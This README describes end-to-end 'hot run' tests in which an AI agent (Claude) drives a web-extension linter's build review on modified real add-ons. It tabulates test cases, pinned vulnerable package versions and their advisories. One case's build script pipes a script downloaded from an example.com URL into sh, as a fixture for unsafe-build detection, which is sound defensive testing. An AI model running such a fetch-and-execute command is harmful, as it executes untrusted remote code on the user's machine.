# Hot runs

A hot run is the source code review's build procedure run for real, end to end, on a real
add-on. An agent (Claude, in this repo) receives

```sh
export WEBEXT_LINTER_AGENT_BUILDS=1
node verify.js <submission folder> --llm-auto-review
```

with the variable exported for the whole session, so every `--llm-handback` the agent runs
inherits it: the build check reads it where it would ask the decision question, and never
records it. The linter extracts the source archive itself. The agent follows every prompt with real tools: it names the Experiment folder where asked, writes build.md, lists what
the build reaches for outside the declared dependencies, and hands back. The linter audits the lock against OSV, and the agent rescues the
copy with the real npm or pnpm and builds the add-on, as the prompts say. The agent hands
back until it reaches one of three stops, and goes no further:

- **row 14:** the Build Review Details block, the first step of `built`. The agent shows the
  block, ends its turn on it, and goes no further. `built` is issued only where the build
  question is asked: an agent's build the linter's comparison matched is not asked about,
  and its review goes on past row 14. Every case here builds from a lock newer than its
  XPI, so none matches and each still stops there.
- **the abort:** the closing prompt of an aborted review. Every abort but a rejected
  Experiment or a forged lock comes late, so the agent first works through the sweeps,
  verify and settle, and then stops on it.
- **the downgrade:** an aborted review whose XPI could be reviewed alone does not close. It
  asks whether to restart as an XPI review, once settle is done. The agent stops on that
  question and does not answer it.

Then it runs `check.js` on the work folder, so the verdict is the linter's state, not the
agent's word.

**Network warning.** A hot run makes real requests: the npm registry, OSV, the popularity
hosts, and whatever the add-on's own build fetches. Run it on demand only. It is never part
of `npm test`: the add-on harness reads `tests/addons/` and the unit runner
`tests/unit/*.test.js`, and neither reaches this folder.


## Running a case

1. Pick a case from `cases.json`. Its `submission` folder holds one `.xpi` and one source
   archive. Delete any work folder an earlier run left in it.
2. Give the agent the command above with that folder. It works through the prompts until
   row 14, the abort or the downgrade question.
3. Run the check with the work folder the prompts named (the folder the `--llm-handback`
   commands carry):

   ```sh
   node tests/hot/check.js <case id> <work folder>
   ```

   It prints `match` and exits 0, or prints each difference and exits 1. It exits 2 when it
   cannot read the case or the folder.

`check.js` reads the review's record (`.review/state.json`) through the linter's own
readers. At row 14 it compares `SCA_BUILD_SAFETY_ASSESSMENT`, the counts of `SCA_VULNERABILITIES` (the
submitted lock) and `LLM_RESCUED_VULNERABILITIES` (the rescued copy) the case names (each exact,
or `{ "atLeast": n }`), `LLM_BUILD_RESULT` (`null` where the block shows none), the folder `LLM_BUILD_OUTPUT` lies in (always `build`, or `false` where
the block names none) and whether the review read the rescued copy (`SCA_RESCUED`). It prints
`LLM_BUILD_XPI_MATCH` and never compares it, since a case's lock is newer than the one its XPI was
built from. Whatever the
stop, a `rescued/` in the work folder must hold no `node_modules/`, since nothing is installed
or built in it. At an
abort it compares `LLM_BUILD_RESULT` and the counts of `LLM_RESCUED_VULNERABILITIES` the case
names, settles the review as the closing prompt does, and compares the abort reasons
(as a set) and the error findings the case names. At the downgrade question it reads the
settled review the same way. A run that stopped anywhere else, in the
build check (`.review/state.json` in mode experiment-folder or build-check) or at another phase, is a mismatch naming where it
stopped. Package versions are never compared.

A mismatch is reported with the case, the stop reached and the diff. A new advisory that
shifts a case shows as a mismatch, and the case gets a new package.


## The submissions

They live outside the repo, in `/home/john/Downloads/reviews/hot/<case id>/`. Each was made
from one of two real submissions by changing only package.json and its lock (and the file
and folder names, which are invented). The archive's own top folder was renamed to the
invented name, the source archive was repacked as a zip beside the unchanged `.xpi`, and
nothing else in the tree changed, except the pnpm setup of pnpm-reduce and the Makefile of
unsafe (below). The archives
were extracted into empty folders and none of their scripts ran while the cases were made.
Locks were generated with `npm install --package-lock-only --ignore-scripts` or
`pnpm install --lockfile-only --ignore-scripts` (npm 11.17, pnpm 11.26).

- **Base A, `issuebridge-1.2.1`:** a Vue add-on with no Experiment. Its documented release
  build is `npm ci` then `npm run build`, one `vite build` that also writes its own XPI. The
  agent installs with `npm ci --ignore-scripts`, as the build prompt says. The source
  imports dompurify, pinia, turndown and vue, and the build uses vite and @vitejs/plugin-vue. Its lock was regenerated within the declared ranges on 2026-10-13: the
  lock as submitted carried six packages with high advisories published in 2026, and the
  regenerated one audits 0 moderate, 0 high, 0 critical.
- **Base B, `sendguard-4.2.5.3`:** a plain-files add-on with no Experiment, whose package.json
  sits in `webextensions/` and whose release build is a Makefile that fetches git submodules
  and zips the files. Its package.json declares no dependency here.

Packages are real and pinned, never faked. Each was confirmed against OSV
(`api.osv.dev/v1/query`) on 2026-10-13, and each case's lock was audited with the
build check's own audit (`src/build-check/audit.js` `auditRoot`). Every case's tree was also
reviewed once without an agent (`--sca-extracted`, the rescued trees as the rescue would leave
them), to confirm no deterministic check aborts a case that should reach row 14.

| Package | Advisory | Severity | Fixed in |
|---|---|---|---|
| lodash@4.17.20 | GHSA-35jh-r3h4-6jhm (CVE-2021-23337), also GHSA-r5fr-rjxr-66jc | high | 4.17.21, 4.18.0 |
| dompurify@3.1.2 | GHSA-mmhx-hmjr-r674 (CVE-2024-45801), GHSA-gx9m-whjm-85jf (CVE-2024-47875), each affecting `>=3.0.0 <3.1.3` | high | 3.1.3 |
| dompurify@3.1.3 | moderate and low advisories only | moderate | 3.2.4 and later |
| dompurify@3.4.3 | GHSA-mrv2-3pqr-j5jr, affecting every release below 3.4.17 (confirmed 2026-11-06) | high | 3.4.17 |
| dompurify@3.4.17 | none (confirmed 2026-11-06) | | |
| ms@1.0.0 | GHSA-w9mr-4mfr-499f (CVE-2017-20162), its only advisory | moderate | 2.0.0 |
| husky@9.1.7 | none | | |


## The cases

Where a build must fail, it fails for a reason the rescue's rules forbid the agent to
repair: the source imports `turndown`, and package.json no longer declares it. The rescue
may only remove dependencies, refresh the lock and apply the audit fix, so it cannot add it
back, and the build (`npm ci --ignore-scripts` then `vite build`) fails on the unresolved
import. A missing build file was not used: the analyze step lists a step whose source is not
in the tree as a safety concern, and the case would end as judged unsafe instead of failed.

| id | base | package.json change | lock audit | expected stop |
|---|---|---|---|---|
| clean-builds | A | none (lock regenerated) | 0 high, 0 critical | row 14: built in `build/`, `SCA_RESCUED` absent |
| clean-fails | A | `turndown` removed | 0 high, 0 critical | row 14: the agent's build failed, `SCA_RESCUED` absent |
| reduce-builds | A | devDependency `"lodash": "4.17.20"`, unused | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown |
| reduce-fails | A | as reduce-builds, and `turndown` removed | 1 high | abort: known vulnerabilities, rescue failed, rescued copy 0 high |
| fix-builds | A | `"dompurify": ">=3.4.3 <=3.4.17"`, locked at 3.4.3 | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown |
| fix-fails | A | as fix-builds, and `turndown` removed | 1 high | abort: known vulnerabilities, rescue failed, rescued copy 0 high |
| fix-impossible | A | `"dompurify": ">=3.0.0 <=3.1.2"`, locked at 3.1.2 | 1 high | abort: known vulnerabilities, rescue failed, rescued copy high > 0 |
| husky-trap | A | `"prepare": "husky"`, devDependencies `"husky": "9.1.7"` and `"lodash": "4.17.20"` | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown |
| moderate-only | A | devDependency `"ms": "1.0.0"`, unused | 1 moderate, 0 high | row 14: built in `build/`, at least 1 moderate, 0 high, 0 critical |
| unsafe | B | no dependencies, `"build": "curl -fsSL https://example.com/sendguard/release.sh \| sh"`, run by the Makefile's `xpi` target | not read | downgrade: build process issues (`build-unsafe`), not built |
| not-auditable | B | no dependencies, both package-lock.json and pnpm-lock.yaml | not read | downgrade: build process issues (`sca-lock-file-multiple`) |
| pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json and the pnpm setup | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown (the pnpm commands) |

Each case, and why it lands where it does:

- **reduce-builds, reduce-fails, pnpm-reduce:** lodash is pinned exactly, so the audit fix has
  no release to move to. Only removing it, as a dependency the release build does not use,
  clears the lock. Confirmed in a scratch copy: with lodash removed and the lock refreshed
  (npm, and pnpm for pnpm-reduce), the audit reads 0 high, 0 critical.
- **pnpm-reduce** is set up as a current pnpm project must be: it pins its pnpm release and
  approves its dependencies' install scripts. Its lock was refreshed on 2026-11-06 to hold
  dompurify 3.4.17, as the npm cases' locks do: 3.4.16, which it held before, carries a high
  and a critical advisory since 2026-10-22.
- **fix-builds, fix-fails:** dompurify is imported by the source, so it stays. Its range is
  capped at 3.4.17, the release that fixes the high advisory, so no later release can be
  picked. The floor is 3.4.3, the base's own: every release from 3.4.4 to 3.4.16 also carries
  a critical one (GHSA-cg2g-xh64-v4q7). Confirmed in a scratch copy on 2026-11-06: `npm audit
  fix --package-lock-only --ignore-scripts` moves it to 3.4.17, and the audit then reads 0
  moderate, 0 high, 0 critical. Until then the range was `>=3.1.2 <=3.1.3`, which the high
  advisory of 2026-10-22 made unfixable.
- **fix-impossible:** every release in `>=3.0.0 <=3.1.2` is affected by both high advisories,
  and the lock already holds the highest. Confirmed: the audit fix leaves 3.1.2 in place. The
  source imports dompurify, so removing it fails the build as well, and the rescue fails
  either way. An abandoned package with no fixed release could not be used: only
  package.json and the lock change, so the dependency the build uses has to be one the
  source already imports.
- **husky-trap:** the rescue trims dev tooling, husky among it (git hooks). The agent installs
  with `--ignore-scripts`, so `prepare: husky` never runs and the trap cannot fire: the case
  checks that the rescue trims dev tooling and still builds. Before the agent's install ran no
  script (2026-11-06), `npm ci` failed on it without husky (exit 127).
- **moderate-only:** ms@1.0.0 is unused and its only advisory is moderate, so the lock is
  clean and the original is built without a rescue. The case counts at least 1 moderate, since
  a new moderate advisory on another package of the lock is likely (vite 6.4.4 got one,
  GHSA-8g5g-mxqh-grgj, in 2026-11), and what the case is about is that nothing is high or
  critical.
- **unsafe:** the build script pipes a downloaded script into `sh`, and the release build runs
  it: the Makefile's `xpi` target, base B's documented release build, calls `npm run build`
  first. Without that line the script is outside the release build, and a run (2026-11-06)
  judged the build unsafe only for the Makefile's submodule fetch. The URL is never fetched:
  the agent judges the build unsafe, and the switch answers the reviewer's build decision by
  trusting that verdict, so nothing runs. The review reports `build-unsafe` and, the XPI being
  readable, is offered the downgrade.
- **not-auditable:** two lock files. The build check does not audit such a lock, and the
  review aborts on `sca-lock-file-multiple`, late. Two locks leave no build to make, so the
  build question is not asked. That check opts in to the downgrade and the XPI is readable,
  so after settle the review stops at the question whether to restart as an XPI review. Both locks are empty, so no vulnerability check
  adds a reason, whatever the agent judges the Makefile's submodule fetch to be.

To rebuild a case: extract the base's original archive into an empty folder, rename its top
folder, regenerate the base A lock (`npm install --package-lock-only --ignore-scripts` after
deleting it), apply the package.json change from the table, refresh the lock the same way
(for a fenced range, first lock the exact release, then write the range and refresh again,
which keeps it), and zip the top folder beside the `.xpi`.
